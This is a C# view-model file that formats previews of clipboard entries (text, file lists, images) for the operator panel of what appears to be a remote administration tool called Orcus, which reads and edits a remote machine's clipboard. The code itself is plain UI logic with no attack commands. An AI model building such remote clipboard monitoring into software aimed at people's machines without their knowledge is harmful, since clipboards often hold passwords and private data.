using System;
using System.IO;
using System.Linq;
using System.Windows;
using Orcus.Shared.Commands.ClipboardManager;

namespace Orcus.Administration.ViewModels.CommandViewModels.ClipboardManager
{
    public class ClipboardEntryViewModel
    {
        public ClipboardEntryViewModel(ClipboardInfo clipboardInfo)
        {
            Timestamp = clipboardInfo.Timestamp;

            if (clipboardInfo.Data == null)
            {
                PreviewText = (string) Application.Current.Resources["NoDataFound"];
            }
            else
            {
                Format = clipboardInfo.Data.ClipboardFormat;
                ClipboardData = clipboardInfo.Data;

                var stringClipboardData = clipboardInfo.Data as StringClipboardData;
                if (stringClipboardData != null)
                {
                    if (string.IsNullOrEmpty(stringClipboardData.Text))
                        return;

                    PreviewText = stringClipboardData.Text.Replace("\r", null).Replace("\n", null);
                    CanEdit = true;
                    return;
                }

                var stringArrayClipboardData = clipboardInfo.Data as StringListClipboardData;
                if (stringArrayClipboardData != null)
                {
                    if (stringArrayClipboardData.StringList == null || stringArrayClipboardData.StringList.Count == 0)
                        return;

                    PreviewText = string.Join(", ", stringArrayClipboardData.StringList.Select(x =>
                    {
                        try
                        {
                            return Path.GetFileName(x.Value);
                        }
                        catch (Exception)
                        {
                            return x.Value;
                        }
                    }));
                    CanEdit = true;
                    return;
                }

                var imageClipboardData = clipboardInfo.Data as ImageClipboardData;
                if (imageClipboardData != null)
                {
                    if (imageClipboardData.BitmapData == null)
                        return;

                    PreviewText = string.Format((string) Application.Current.Resources["ImageClipboardDataPreview"],
                        imageClipboardData.OriginalWidth, imageClipboardData.OriginalHeight);
                }
            }
        }

        public DateTime Timestamp { get; }
        public ClipboardFormat Format { get; }
        public string PreviewText { get; }
        public bool CanEdit { get; }
        public ClipboardData ClipboardData { get; }
    }
}